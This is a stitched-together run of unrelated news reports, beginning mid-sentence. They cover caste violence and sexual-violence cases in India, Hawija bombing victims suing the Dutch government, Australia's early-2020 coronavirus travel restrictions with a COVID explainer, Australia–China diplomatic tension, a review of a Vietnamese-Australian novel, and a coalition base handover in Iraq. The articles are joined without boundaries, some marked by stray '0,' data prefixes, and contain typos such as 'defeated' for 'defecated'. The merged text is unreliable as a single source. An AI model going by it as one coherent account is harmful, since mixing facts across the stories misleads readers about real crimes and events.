stated that six people have been arrested so far. https://t.co/BqqRSWsnrV इस वीडियो में गलत बताया है कि एक दलित व्यक्ति को वर्चस्वी जाति द्वारा प्रताड़ित किया गया। जबकि वास्तविकता यह है कि यह घटना 5 दिन पहले पारिवारिक विवाद को लेकर घटित हुई थी। पुलिस ने प्रसंज्ञान लेते हुए अपनी तरफ से FIR दर्ज कर 6 लोगों को गिर. किया है — Barmer Police (@Barmer_Police) July 31, 2020 An incident where a youth from the Scheduled Tribes Bhil sub-caste was thrashed by people from his own community was shared on social media with the false claim that a Dalit man was tortured in Rajasthan.

The victims are now suing the Dutch government for compensation. Could this set a precedent?   ""We hate the Netherlands for what happened,"" says Fatima Dawoud. Thirty-five members of her family were affected by the bomb that hit the city of Hawija, south-west of Kirkuk, in July 2015. Dutch media have established that a Dutch plane dropped the bomb as part of the operation of the international coalition against the Islamic terror group ""Islamic State"" (IS). All of the 20 or so men and women who have gathered in a cold room in Hawija's partly reconstructed town hall are victims of the air raid on an IS bomb factory. They survived the inferno that destroyed a large part of their town, but lost family members, homes and incomes. That's why they're demanding compensation from the Dutch government. They have brought pictures of their wounds suffered in the raid and talk about its disastrous effects. Mohammed Khalef lost his father. ""I was sleeping on the roof when our home partly collapsed. My parents were downstairs and were buried in the rubble."" The Iraqi government has done little to help the victims of the bomb blast ""Now my children are scared of anything they see or hear in the air,"" says Abdullah Ramadan, while a woman describes how her cousin went crazy. ""He eats washing powder. They have to tie him down."" Deadly chemical mix Many survivors complain about health issues resulting from the chemical mix released by the bomb. Fatima Dawoud's daughter has contracted cancer. ""We have no income, and we cannot pay for medication,"" says Dawoud. The bomb targeted a building IS was using as a bomb factory in an industrial compound enclosed on three sides by civilian neighborhoods. Three tanker lorries filled with explosives were parked there, ready to be used in an attack on the oil refinery at Baiji. A nearby warehouse was used to store the fertilizer IS used in its bomb production. Read more: 'Islamic State' sleeper cells spread fear in Iraq's Hawija The deadly mix killed at least 70 civilians. People as far as a kilometer away from the site died due to the shockwave that followed the enormous blast. ""People were sleeping outside, because of the heat. Some were thrown meters through the air by the force of the explosion,"" says Musa Jassam, the mayor of the Yarmouk neighborhood, which was the worst affected. Houses, shops, schools and hospitals were destroyed. Can the Netherlands be held to account? Four years after the raid, the exact number of victims is still unclear. The survivors are now looking to the Netherlands for compensation — the Iraqi government is not offering any. People not only lost their homes; they also lost their breadwinners and sources of income. Some 200 shops were destroyed in the attack. ""I have no windows, no doors and no money,"" one of the women says. ""The Dutch government has to help us."" A western country like the Netherlands should take responsibility for its actions, says Mohammed Mahmoud, the deputy mayor of Hawija. ""If you make a mistake, you try to make amends. In Iraq, in any accident or conflict, the person who is responsible pays."" That's why Al-Ghad, an NGO based in Kirkuk, has collected information from everyone present in the hall. So far, it has been able to document 50 cases out of a probable 300 eligible survivors, says its director, Tofan Awad. ""Many have come forward, but we have to check everything. Which is not easy, as much of the evidence has gone. In 2015, there were no state hospitals in Hawija, and no legal local government."" Read more: Is the 'Islamic State' making a comeback in Iraq? If the Iraqi victims win their case against the Netherlands, it could could create a major precedent IS did not allow any phones, so pictures are rare. ""The injured are the toughest cases, as they had nowhere to go and have no documents. They think their scars should be evidence enough, but they are not,"" says Awad. Al-Ghad will hand the files to the office of Liesbeth Zegveld, a Dutch lawyer who specializes in compensation cases like this one. She plans to use two of the most compelling cases to file a claim against the Dutch Ministry of Defense for accountability. One case involves a family that lost a mother and five children in the attack. However, Defense Minister Ank Bijleveld has told the Dutch Parliament that the Iraqi authorities are responsible for covering the damage, as they invited the coalition to Iraq to fight IS. The minister has announced that she will soon make a decision on whether to open a special aid fund for the victims of Hawija, as ""a gesture of good will."" A precedent in the making? ""That will be too much like development aid,"" Zegveld says, ""while it should be about taking responsibility for one's actions."" She points out that, according to the coalition forces, all members are equally responsible for the casualties. Apart from two Dutch air raids — the one on Hawija plus another on Mosul — it's not clear what other countries' planes were involved in the thousands of strikes on IS targets. But she agrees that if the details of other bombings were also to be unveiled, a Dutch conviction could create an important precedent, possibly inspiring journalists and NGOs to investigate and initiate liability cases in other countries, too. Read more: Opinion: 'Islamic State' may fall, but will not vanish The Dutch authorities have declared that they cannot be held accountable, since the enormous damage was caused as a result of inaccurate information provided by others. ""If a mistake is made because there were more explosives than expected, the liability lies with the Dutch,"" says Zegveld.

The Amaravati Parirakshana Samithi joint action committee leaders Siva Reddy and Tirupati Rao paid tributes to the deceased farmer and consoled his family members.  Tirupati Rao said that the family members of the farmer should not get disheartened and the JAC would extend the support to them. He said that the farmers, who donated their land for the capital city, had been agitating for Amaravati. However, after the announcement of shifting of the capital city, they are depressed over the issue.  Dalit JAC leader Gaddam Martin Babu described the death of Nagulu as ""murder by the government"". The Dalits were half dead when the GO 41 was cancelled and they had been finding it hard to digest when the government ordered that the land should not be sold or purchased. Nagulu is survived by two daughters who are yet to be married and they do not have even a house, he said and demanded the government to come to the rescue of the family of Nagulu.  © 2021 Hyderabad Media House Limited/The Hans India.

These individuals arriving out of mainland China, not just the Hubei province, are required to self-isolate for a period of 14 days from the time they leave the country. The Department of Foreign Affairs also raised its travel advice for China to the highest level of 'do not travel'. The beefed up measures come on the same day three more coronavirus cases - one in Melbourne and two in South Australia - were confirmed, taking the national tally to 12. Qantas also announced on Saturday that it will suspend its two direct services to mainland China from February 9 until March 28. Visitors flying in from mainland China will be denied from entering Australia.

Many airlines have temporarily reduced or stopped flights,' Smart Traveller says on its website. * Qantas will halt its two direct services to mainland China, saying entry restrictions imposed the United States, Singapore and other countries will impact crews working across the airline's international network. 'Our first responsibility is to Australians,' Mr Morrison told reporters on Saturday afternoon. As of Saturday, all travellers arriving out of mainland China are being asked to self-isolate for a period of 14 days from the time they depart the country. 'In addition to that, there'll be advanced screening and reception arrangements put into place at the major airports to facilitate identifying and providing this information and ensuring the appropriate precautions are being put in place,' Mr Morrison said. 'There's a half a million masks that will be provided to those airports to support those who are coming off these flights as well as those who are with those coming from those flights. 'There'll also be thermometers which are provided to those airports and we're working with those airport authorities now to ensure we can put those arrangements in place.' Australians are advised not to travel to mainland China after the number of confirmed coronavirus cases across the nation grew to 12 on Saturday. South Australia confirmed two cases of the potentially fatal coronavirus on Satruday, taking the national total to 12. A Chinese couple in their 60s from the city of Wuhan, the epicentre of the outbreak, were visiting family in South Australia. SA Health Chief Public Health Officer Nicola Spurrier on Saturday confirmed that the two new cases have been admitted to hospital. 'These cases were people that have come from Wuhan, China. They are visiting relatives in South Australia,' she said. 'They have followed all of the procedures and information that they have been asked to through communicable disease control branch.' They developed symptoms and were tested at a public hospital before self-isolating at home. Their relative has been tested, with results pending. 'We do not think there have been any contacts with anybody else in the state and they have been in self-isolation for the required time,' she said. The couple is understood to have left Wuhan on January 20. It comes after 25 people have been tested in South Australia with 15 of those tests coming back negative earlier on Saturday. The measures were announced on the same day Qantas (airline staff pictured on Friday) revealed plans to suspend its direct flights to mainland China Three more cases of coronavirus (pictured) on Saturday have taken Australia's tally to 12 NEW SOUTH WALES: 4 Four people in NSW have been diagnosed with coronavirus, including three men and one woman. January 25 January 27 VICTORIA: 4 January 25 January 29 January 30 She is being treated at Royal Melbourne Hospital. February 1 A Melbourne woman aged in her 20s is at home recovering. She returned from Wuhan on January 25 and fell ill two days later. She was not infectious on the flight, and has remained in isolation since being tested. QUEENSLAND: 2 January 29 January 30 SOUTH AUSTRALIA: 2 February 1 A Chinese couple were placed in isolation in a public hospital. The man and a woman both aged 60, were from Wuhan and visiting relatives in South Australia. SA Health said the pair isolated themselves at home when they developed symptoms and awaited the results of the coronavirus test. Australia has raised the travel alert level to 'do not travel' for the city of Wuhan - the epicentre of the outbreak - and for the entire Hubei province. Chief Medical Officer Brendan Murphy says unless people have contact with someone who is unwell and has come from that part of China, there is no need for current concern. 'Some very strong measures have been put in place regarding travel to and from China. We will be working hand in glove with the federal government on this issue,' Premier Steve Marshall said. 'We will be doing everything we can to make sure that they (South Australians) remain safe and we take every precaution possible to prevent the spread of this virus.' A fourth case in Victoria was also confirmed on Saturday. The woman aged is in her 20s, lives in Melbourne and is at home recovering. She returned from Wuhan on January 25 and fell ill two days later. Health authorities insisted she was not infectious on the flight, and has remained in isolation since being tested. There are four cases in New South Wales, and two more in Queensland. 'It is a very difficult time. There is absolutely no question about,' foreign minister Marise Payne told reporters. 'A very difficult time for China, for its citizens, for Australians who are currently in China will have family in China, and indeed for the international community. 'It is a significant period of disruption and we are very conscious about and endeavouring to work as constructively as we can.' It came on the same day national airline carrier Qantas suspended flights to China, where the death toll has climbed past 250. Its two direct services to mainland China - Sydney to Beijing and Sydney to Shanghai will be suspended from Sunday February 9 until March 29. 'This follows entry restrictions imposed by countries including Singapore and the United States, which impact the movement of crew who work across the Qantas International network,' a Qantas statement read. 'These entry restrictions pose significant logistical challenges for rostering crew to operate mainland China services, leading to the need to temporarily suspend these flights. There is no change to Qantas services to Hong Kong, which is exempt from current travel restrictions. Qantas warned it may bring forward the planned suspension if demand levels or other factors change. 'The date for flights to resume will also be regularly reviewed based on the circumstances,' the statement added. Suspending flights arriving from China was not part of the advice provided by health chiefs, Mr Morrison added. Meanwhile, government officials are expecting the Chinese government to approve a plan to evacuate Australians in Wuhan using a Qantas plane 'very soon', Minister Payne said. 'I would like to register my thanks to the Chinese authorities for their cooperation on this operation in exceedingly difficult circumstances,' she added. Some individuals confirmed to have been infected with novel coronavirus have since been discharged from medical facilities, Mr Morrison said. He had stood behind a decision to send Australian citizens to a detention facility on Christmas Island as an appropriate quarantine measure. The prime minister said he had been in regular contact with New Zealand Prime Minister Jacinda Arden, and is seeking to ensure border arrangements between the neighbouring countries are aligned. The federal government measure comes after Queensland Premier Annastacia Palaszczuk called for incoming flights to be halted until the virus is contained. 'I don't often agree with Donald Trump, but I do agree with the US authorities on this occasion that I think we should take every measure possible to combat this virus,' she said. But Mr Morrison said the current advice from medical experts was not to move to 'that level of action'. 'This provides (Australians in mainland China) with the opportunity to return to Australia,' he said. Half a million face masks will be provided to major airports under the government measures 'Our first responsibility is to Australians,' Prime Minister Scott Morrison (pictured) announced What is the coronavirus? A coronavirus is a type of virus which can cause illness in animals and people. Viruses break into cells inside their host and use them to reproduce itself and disrupt the body's normal functions. Coronaviruses are named after the Latin word 'corona', which means crown, because they are encased by a spiked shell which resembles a royal crown. The coronavirus from Wuhan is one which has never been seen before this outbreak. It has been named SARS-CoV-2 by the International Committee on Taxonomy of Viruses. The name stands for Severe Acute Respiratory Syndrome coronavirus 2. Experts say the bug, which has killed around one in 50 patients since the outbreak began in December, is a 'sister' of the SARS illness which hit China in 2002, so has been named after it. The disease that the virus causes has been named COVID-19, which stands for coronavirus disease 2019. Dr Helena Maier, from the Pirbright Institute, said: 'Coronaviruses are a family of viruses that infect a wide range of different species including humans, cattle, pigs, chickens, dogs, cats and wild animals. 'Until this new coronavirus was identified, there were only six different coronaviruses known to infect humans. Four of these cause a mild common cold-type illness, but since 2002 there has been the emergence of two new coronaviruses that can infect humans and result in more severe disease (Severe acute respiratory syndrome (SARS) and Middle East respiratory syndrome (MERS) coronaviruses). 'Coronaviruses are known to be able to occasionally jump from one species to another and that is what happened in the case of SARS, MERS and the new coronavirus. The animal origin of the new coronavirus is not yet known.' The first human cases were publicly reported from the Chinese city of Wuhan, where approximately 11million people live, after medics first started publicly reporting infections on December 31. By January 8, 59 suspected cases had been reported and seven people were in critical condition. Tests were developed for the new virus and recorded cases started to surge. The first person died that week and, by January 16, two were dead and 41 cases were confirmed. The next day, scientists predicted that 1,700 people had become infected, possibly up to 7,000.  Where does the virus come from? According to scientists, the virus almost certainly came from bats. Coronaviruses in general tend to originate in animals – the similar SARS and MERS viruses are believed to have originated in civet cats and camels, respectively. The first cases of COVID-19 came from people visiting or working in a live animal market in Wuhan, which has since been closed down for investigation. Although the market is officially a seafood market, other dead and living animals were being sold there, including wolf cubs, salamanders, snakes, peacocks, porcupines and camel meat. A study by the Wuhan Institute of Virology, published in February 2020 in the scientific journal Nature, found that the genetic make-up virus samples found in patients in China is 96 per cent identical to a coronavirus they found in bats. However, there were not many bats at the market so scientists say it was likely there was an animal which acted as a middle-man, contracting it from a bat before then transmitting it to a human. It has not yet been confirmed what type of animal this was. Dr Michael Skinner, a virologist at Imperial College London, was not involved with the research but said: 'The discovery definitely places the origin of nCoV in bats in China. 'We still do not know whether another species served as an intermediate host to amplify the virus, and possibly even to bring it to the market, nor what species that host might have been.' So far the fatalities are quite low. Why are health experts so worried about it? Experts say the international community is concerned about the virus because so little is known about it and it appears to be spreading quickly. It is similar to SARS, which infected 8,000 people and killed nearly 800 in an outbreak in Asia in 2003, in that it is a type of coronavirus which infects humans' lungs. It is less deadly than SARS, however, which killed around one in 10 people, compared to approximately one in 50 for COVID-19. Another reason for concern is that nobody has any immunity to the virus because they've never encountered it before. This means it may be able to cause more damage than viruses we come across often, like the flu or common cold. Speaking at a briefing in January, Oxford University professor, Dr Peter Horby, said: 'Novel viruses can spread much faster through the population than viruses which circulate all the time because we have no immunity to them. 'Most seasonal flu viruses have a case fatality rate of less than one in 1,000 people. Here we're talking about a virus where we don't understand fully the severity spectrum but it's possible the case fatality rate could be as high as two per cent.' If the death rate is truly two per cent, that means two out of every 100 patients who get it will die. 'My feeling is it's lower,' Dr Horby added. 'We're probably missing this iceberg of milder cases. But that's the current circumstance we're in. 'Two per cent case fatality rate is comparable to the Spanish Flu pandemic in 1918 so it is a significant concern globally.' How does the virus spread? The illness can spread between people just through coughs and sneezes, making it an extremely contagious infection. And it may also spread even before someone has symptoms. It is believed to travel in the saliva and even through water in the eyes, therefore close contact, kissing, and sharing cutlery or utensils are all risky. It can also live on surfaces, such as plastic and steel, for up to 72 hours, meaning people can catch it by touching contaminated surfaces. Originally, people were thought to be catching it from a live animal market in Wuhan city. But cases soon began to emerge in people who had never been there, which forced medics to realise it was spreading from person to person. What does the virus do to you? What are the symptoms? Once someone has caught the COVID-19 virus it may take between two and 14 days, or even longer, for them to show any symptoms – but they may still be contagious during this time. If and when they do become ill, typical signs include a runny nose, a cough, sore throat and a fever (high temperature). The vast majority of patients will recover from these without any issues, and many will need no medical help at all. In a small group of patients, who seem mainly to be the elderly or those with long-term illnesses, it can lead to pneumonia. Pneumonia is an infection in which the insides of the lungs swell up and fill with fluid. It makes it increasingly difficult to breathe and, if left untreated, can be fatal and suffocate people. Figures are showing that young children do not seem to be particularly badly affected by the virus, which they say is peculiar considering their susceptibility to flu, but it is not clear why. What have genetic tests revealed about the virus? Scientists in China have recorded the genetic sequences of around 19 strains of the virus and released them to experts working around the world. This allows others to study them, develop tests and potentially look into treating the illness they cause. Examinations have revealed the coronavirus did not change much – changing is known as mutating – much during the early stages of its spread. However, the director-general of China's Center for Disease Control and Prevention, Gao Fu, said the virus was mutating and adapting as it spread through people. This means efforts to study the virus and to potentially control it may be made extra difficult because the virus might look different every time scientists analyse it. More study may be able to reveal whether the virus first infected a small number of people then change and spread from them, or whether there were various versions of the virus coming from animals which have developed separately. How dangerous is the virus? The virus has a death rate of around two per cent. This is a similar death rate to the Spanish Flu outbreak which, in 1918, went on to kill around 50million people. Experts have been conflicted since the beginning of the outbreak about whether the true number of people who are infected is significantly higher than the official numbers of recorded cases. Some people are expected to have such mild symptoms that they never even realise they are ill unless they're tested, so only the more serious cases get discovered, making the death toll seem higher than it really is. However, an investigation into government surveillance in China said it had found no reason to believe this was true. Dr Bruce Aylward, a World Health Organization official who went on a mission to China, said there was no evidence that figures were only showing the tip of the iceberg, and said recording appeared to be accurate, Stat News reported.  Can the virus be cured? The COVID-19 virus cannot be cured and it is proving difficult to contain. Antibiotics do not work against viruses, so they are out of the question. Antiviral drugs can work, but the process of understanding a virus then developing and producing drugs to treat it would take years and huge amounts of money. No vaccine exists for the coronavirus yet and it's not likely one will be developed in time to be of any use in this outbreak, for similar reasons to the above. The National Institutes of Health in the US, and Baylor University in Waco, Texas, say they are working on a vaccine based on what they know about coronaviruses in general, using information from the SARS outbreak. But this may take a year or more to develop, according to Pharmaceutical Technology. Currently, governments and health authorities are working to contain the virus and to care for patients who are sick and stop them infecting other people. People who catch the illness are being quarantined in hospitals, where their symptoms can be treated and they will be away from the uninfected public. And airports around the world are putting in place screening measures such as having doctors on-site, taking people's temperatures to check for fevers and using thermal screening to spot those who might be ill (infection causes a raised temperature). However, it can take weeks for symptoms to appear, so there is only a small likelihood that patients will be spotted up in an airport. Is this outbreak an epidemic or a pandemic? The outbreak was declared a pandemic on March 11. A pandemic is defined by the World Health Organization as the 'worldwide spread of a new disease'. Previously, the UN agency said most cases outside of Hubei had been 'spillover' from the epicentre, so the disease wasn't actually spreading actively around the world.

0,"Australia is continuing to demand an inquiry into the origins of coronavirus, staring down a dramatic escalation in diplomatic tensions with China. Ambassador Cheng Jingye has floated a Chinese consumer boycott of Australian products, including agriculture, education and tourism, in response to the probe. The Chinese embassy also controversially released details of a private conversation with Australia's top diplomat. Chinese state media have launched a series of scathing attacks, with one likening Australia to gum stuck to the bottom of China's shoe. With relations in the doldrums, Prime Minister Scott Morrison is refusing to back down on his push for a global coronavirus inquiry. ""We will, of course, continue to support moves to ensure there is a proper independent assessment of what has occurred here,"" he said on Wednesday. ""It is not a remarkable position. It is a fairly common sense position and one that we don't resile from."" Mr Morrison said he would keep up the pressure for an investigation ahead of a World Health Assembly meeting next month. China released details of Mr Cheng's phone call with Department of Foreign Affairs and Trade secretary Frances Adamson in a major departure from diplomatic convention. After DFAT expressed regret over the release, the Chinese embassy retaliated by accusing Australia of leaking details of the phone call first. ""The embassy of China doesn't play petty tricks, this is not our tradition. But if others do, we have to reciprocate,"" a spokesman said. Home Affairs Minister Peter Dutton said the inquiry was not about China but about arming scientists with tools ""sooner rather than later"". ""If there is any information that is available that would aid those scientific endeavours to try and find a vaccine or an adequate medical response to this virus, then we want that information now,"" he told the ABC. Attorney-General Christian Porter said opposition to an inquiry was irrational, illogical and unreasonable. ""I think that the Chinese ambassador's response was largely emotional and generally speaking, those types of emotional responses are relatively short-lived,"" he told 6PR radio. Labor leader Anthony Albanese echoed the prime minister in downplaying the significance of a coronavirus inquiry. ""I regard as completely unremarkable the idea that there should be an investigation into this,"" he told Sky News. Crossbench senator Rex Patrick will have a sixth crack at establishing a parliamentary inquiry into relations with China when parliament sits next month. ""The ambassador revealed China's true diplomatic face and confirmed concerns about China's preference for control and coercion rather than partnership,"" he said. Australian Associated Press"
0,"A five-year-old Dalit girl died of hunger in Latehar on Saturday afternoon, her mother told economist-activ­ist Jean Dreze there on Sunday, the day the nationwide Covid-19 lockdown entered its fourth phase. Dreze, who was with two other Right to Food activists at Hesatu village in Latehar, heard bereaved mother Kalawati Bhuiyan’s recall events leading to her daughter’s death. “Bhook se,” whispered the woman when asked why her daughter Nima­ni died. She added that the child had not eaten for four days. Nimani and her seven siblings had nothing to eat because there was no food in the house, Kalawati, the wife of a landless brick kiln labourer in Latehar’s Manika block, said. The woman and her eight children lived in a mud hut with a leaking roof, her husband Jaglal worked at a brick kiln at a village named Sukulhut some 40km away. When he heard about Nimani’s death, Jagdal rushed home. Jagdal said his family had no ration card. “I will get my wages at the brick kiln only after the entire season is over. I get to eat there,” he said. The bureaucratic damage control seems to have already started at the local level. “The girl had taken a bath in the river on a hot day and died because of that,” an anganvadi worker reportedly said. However, Dreze and the two activists with him, Dilip Rajak and Pachati Singh, affirmed there were enough reasons to believe the family had nothing to eat.” Kalawati got a single instalment of Rs 500 credited to her Jan-Dhan Yojana account and some food or cash from the local anganwadi centre. “But that was not enough to the feed the large family,” the activists argued. “There is no provision to give ration to households that do not have a ration card and have not applied for the same online,” Dreze said, quoting the local ration dealer Iswari Prasad Gupta. The family also did not get 10kg of rice that was supposed to be given to such families during the lockdown, Gopal Oraon, husband of mukhiya Parvati Devi, admitting before a local TV channel that the Rs 10,000 given by the state to the mukhiya for the purpose was exhausted. “The poorest families are having a tough time during these hard days,” Dreze said."
0,"Follow us: Emerging Vietnamese-Australian writer Vivian Pham reimagines 1998 Cabramatta in her debut novel ‘The Coconut Children.’ Set in summer, before Vivian was born, ‘The Coconut Children’ captures a unique sense of nostalgia that Vivian says came from her experiences in Cabramatta as a child. “I always felt like Cabramatta was already a memory, even though I was living through it and it was still there,” she says, “I felt like the whole suburb was based on people’s memories of what their home country was like.” Vivian says the Cabramatta of her novel may not be accurate to reality, but reflects how she experienced it growing up, and has become her own romanticised manifestation of that time. Photo courtesy of Secret Book Stuff The novel sensitively blends humour with the trauma associated with being a child of Vietnamese immigrants, creating an authentic coming-of-age story which Vivian hopes will be relevant to other Vietnamese Australians. Vivian notes that much of the Vietnamese media identity revolves around trauma and painful historical events and that she wanted to emphasise the importance of laughter and community. Vivian commented that much of her own humour has been shaped by movies she watched with her family growing up and from competing with her sister to be the funniest person in Vietnamese. “[Watching films with your family] substitutes the silence that you feel a lot growing up with migrant parents, the things that they say and the things that they don’t say,” Vivian says, “…and making jokes in another language makes you feel closer to the people who speak it… it makes [you] feel incredibly proud and part of something big.”   Related Stories  ‘The Coconut Children’ is inspired by Vivian’s father and his epic journey as a Vietnamese refugee. Vivian says that unlike her novella in 2017, ‘The Coconut Children’ tells her father’s story from the child’s perspective, which is something that was incredibly freeing for her. “I had more freedom to rewrite the story in my own words and what his journey meant to me,” Vivian says, “I had the freedom to fictionalise it… [which was important because] as children of refugees, you feel that there’s so much you have to remember and if you don’t remember these stories might disappear.” Vivian says that the depth of description in her novel also stems from fears she had being a child of refugees, and in trying to remember everything that happened before she was born so that it would not be forgotten. She says it was important for her characters to “be released from the burden of remembering… and to experience a moment of peace.” ‘The Coconut Children’ is essential reading for those apart of or interested in the Vietnamese diaspora in Australia and is a captivating and refreshing narrative from a talented and thoughtful young author. “The reason it was important for me to get the story down on a page was because I wanted to think of the generational experiences of refugee families… [to look at] what separates us and what brings us together,” Vivian says.

(Photo | Shekhar Yadav) NEW DELHI: Hitting out at the BJP over the Hathras gangrape incident, the Congress Tuesday questioned the ""silence"" of Prime Minister Narendra Modi and women leaders of his party, and alleged Uttar Pradesh under the Yogi Adityanath government has become the ""crime capital"" of the country. The Opposition party's attack on the Centre and the state government came after a 19-year-old Dalit woman from Hathras died at Safdarjung hospital in Delhi Tuesday morning, days after she was allegedly raped by four men. The Congress also protested at the Vijay Chowk over the incident, demanding justice for the victim. The party said its leaders PL Punia, Udit Raj, Amrita Dhawan along with other functionaries were detained at Mandir Marg Police station for the protest. Congress leader Rahul Gandhi attacked the government over the incident, saying the ""class-specific jungle raj"" of UP has killed another young woman. ""The government said that this is fake news and left the victim to die. Neither was this unfortunate incident fake, nor was the death of the victim and the mercilessness of the government,"" he said in a tweet in Hindi. Congress general secretary in-charge Uttar Pradesh Priyanka Gandhi Vadra also hit out at the Yogi Adityanath government, alleging there is ""no semblance of security"" for women in the state. ""A Dalit girl who was victim of demoniac behavior in Hathras has passed away at Safdarjung Hospital. For two weeks, she struggled between life and death in hospitals,"" she said in a tweet in Hindi. She said incidents of rape one after another, in Hathras, Shahjahanpur and Gorakhpur have shaken the state. ""Law and order in UP has deteriorated beyond limits. There is no semblance of safety for women. Criminals are committing crimes in the open,"" Priyanka Gandhi said. The killers of this girl should be punished severely, she demanded. ""You are accountable for the safety of women in UP,"" the Congress leader tweeted, tagging Chief Minister Yogi Adityanath. At a press conference, Congress spokesperson Supriya Shrinate alleged that for eight days no gangrape charges were pressed in the matter and only after the media reported it, the police registered a case. She also alleged that the UP chief minister's information advisor and the Agra Police, up until September 24, kept calling this ""fake news"". ""Questions still remain. Why did it take eight days for the UP police to register a gangrape case on her complaint, why was she immediately not transferred to a premier institute like AIIMS, and instead was left to die in UP? Why is it that these men who brutally assaulted, raped and murdered her, do not face NSA (National Security Act) charges and why is it that the UP chief minister is absolutely quiet on this?"" Shrinate asked. Claiming that there is no law and order in UP, she alleged the police are ""hand in glove"" with criminals and the government extends them ""political patronage"". ""I will also raise questions on the absolute conspicuous silence of the prime minister, and women leaders of the BJP who had at one point in time said it is their moral duty to raise their voice on crimes against women and today when they are in charge of those departments, they do not utter a word,"" she said. If one does not condemn this, then one is very much ""hand in glove"" with the criminals, Shrinate said. The Congress demands justice for the rape victim and the culprits should be brought to book, she said. It should be a speedy trial, and the UP government should apologise to her family for calling it ""fake news"" for as long as they did, Shrinate added. Citing that crimes against women had taken place in various cities in the state such as Hathras, Unnao, Shahjahanpur, Gorakhpur, Barabanki and Lakhimpur, Shrinate alleged that women are subjected to brutal rape, assault and murder in the state and the government ""keeps quiet and turns the other way"". ""UP is today the crime capital of the country not just in murder and extortion, but in rapes and molestation. When will this end? The reason that it is not ending is because the UP government has tainted members,"" she said. ""Will the members who face criminal charges of rape and murder"" be responsible for enforcing law and order in the state, she asked. Out of about 312 BJP MLAs, 83 face serious charges such as murder and rape, Shrinate claimed. ""We stand in solidarity with the victim's family. I extend my heartfelt condolences to the family,"" she added. The woman was allegedly gang-raped on September 14 following which she was admitted to the Jawaharlal Nehru Medical College and Hospital in Aligarh. She was referred to the Delhi hospital on Monday after her condition showed no signs of improvement. On September 14, the woman had gone to the fields with her mother and had gone missing soon after. She was later found brutally injured, with her tongue having a serious cut as she bit it while the accused attempted to strangulate her, an SP had said, while giving details of the incident.

Posted: Mar 29, 2020 / 08:23 AM EDT Updated: Mar 29, 2020 / 08:23 AM EDT Posted: Mar 29, 2020 / 08:23 AM EDT Updated: Mar 29, 2020 / 08:23 AM EDT BAGHDAD (AP) — The U.S.-led coalition withdrew on Sunday from a military base in northern Iraq that nearly launched Washington into an open war with neighboring Iran. The K1 Air Base is the third site coalition forces have left this month in line with U.S. plans to consolidate its troops in two locations in Iraq. A rocket attack on the base in late December killed one American contractor and lead to a series of tit-for-tat attacks between the U.S. and Iran-backed Iraqi militia groups. The attacks culminated in the U.S.-directed killing of top Iranian general Qassim Soleimani and senior Iraqi militia leader Abu Mahdi al-Muhandis. Coalition forces handed over the K1 air base in the northern Iraqi province of Kirkuk to Iraq’s military, according to a coalition statement. At least $1.1 million of equipment was transferred to the Iraqis as 300 coalition personnel departed. K1 has hosted coalition forces since 2017 to launch operations against the Islamic State group in the nearby mountainous areas. Areas south of Kirkuk, and north of neighboring provinces of Diyala, Salahaddin and Nineveh remain hot beds of IS activity. The stretch of territory is also disputed between the federal Iraqi government and the autonomous Kurdish region, which has created security gaps benefiting IS militants. The coalition’s presence had at times been a mediating presence between the two competing authorities. A senior coalition official earlier this month claimed IS forces weren’t as able to exploit the “security gap” between Iraqi and Kurdish forces as the militants did in the past. “That doesn’t necessarily mean that Daesh is free to operate in the way that they wish,” said the official, using the Arabic acronym for the IS group. “They’re still pretty constrained.” The coalition official was speaking on condition of anonymity in line with regulations. U.S.-led forces have already withdrawn this month from Qaim, near the border with Syria and Qayara base, in Nineveh earlier. All were in line with plans to pullout from bases across Iraq and consolidate coalition forces in Baghdad and at Ain al-Asad Air Base in the country’s western desert. The plan has been in the works since late last year, the senior coalition military official said, and accelerated when Iraqi forces proved they were capable of facing the threat from the IS with limited coalition assistance. Coalition officials said they would still assist Iraqi forces with air support and surveillance, but significantly cut back on training and ground operations, as the limited withdrawal continues. Until last month, there were some 7,500 coalition troops based in Iraq, including 5,000 U.S. forces. Copyright 2022 Nexstar Media Inc. All rights reserved.

According to the police, the accused took the woman to a doctor after the rape, but when her condition deteriorated, sent her home. Senior police officers said two men, identified as Shahid and Sahil, have been arrested. They had called her to their place 'on the pretext of friendship', an officer said. 'We have received a complaint at the Gaisri police station. The woman's family members said she worked at a private firm. On Tuesday, she did not return till late night. When they tried to contact her on phone, they could not reach her. Later in the night, the girl came home on a rickshaw in a bad condition, with glucose drips attached to her arms. She was rushed to a hospital, but died on the way,' said Balrampur SP Dev Ranjan Verma. Verma said an FIR had been registered and probe was underway. 'In the complaint, the family members have alleged that two youth raped the girl and then took her to a doctor. When her condition deteriorated, instead of taking her to a hospital, they sent her home. We have arrested both the accused,' he added. Social media was soon rife with claims that the woman's arms and legs had been broken. The Balrampur police, however, put out several tweets denying this, saying the postmortem report had not found such injuries. थाना को0 गैसड़ी में हुए घटना के संबंध में मृतका के भाई की तहरीर पर अभियोग पंजीकृत करते हुए दोनों नामजद अभियुक्तों को गिरफ्तार कर लिया गया है । अन्य जांच एवं विधिक कार्यवाही की जा रही है। हाथ, पैर व कमर तोड़ने वाली बात असत्य है। @Uppolice @AdgGkr @dgpup @PrashantK_IPS90 pic.twitter.com/0LG2yHMguz — BALRAMPUR POLICE (@balrampurpolice) September 30, 2020 Reacting to the incident, Samajwadi Party president Akhilesh Yadav asked the government to 'avoid the negligence they showed in the Hathras case' and take strict action.

Chennai: A 24-year-old Dalit man from Villupuram district in Tamil Nadu was lynched by a mob because he defecated in an open field that belonged to a person from a dominant caste. A video of the February 12 incident shows Sakthivel being brutally thrashed by locals in a hamlet in Villupuram. The police made arrests after the video clip went viral. A complaint was also lodged by Sakthivel's sister at a local police station. According to the complaint filed by Shaktivel’s sister, he was attacked after he defeated in an open field that belonged to a dominant caste section of people. She claimed that the mob became violent after learning that he was a Dalit. Sakthivel’s sister said she received a call for help from her brother, who told her he was being attacked in a field. She rushed to the spot and managed to save Shaktivel with the help of police. But Shaktivel lost consciousness on reaching home and died before the medics arrived.  Seven people were arrested on Friday under five sections, including punishment of murder and under prevention of Atrocities Against SC/ST Act. Thol. Thirumavalavan, leader of Dalit outfit VCK, visited the grieving family and later demanded action against those responsible for the crime."
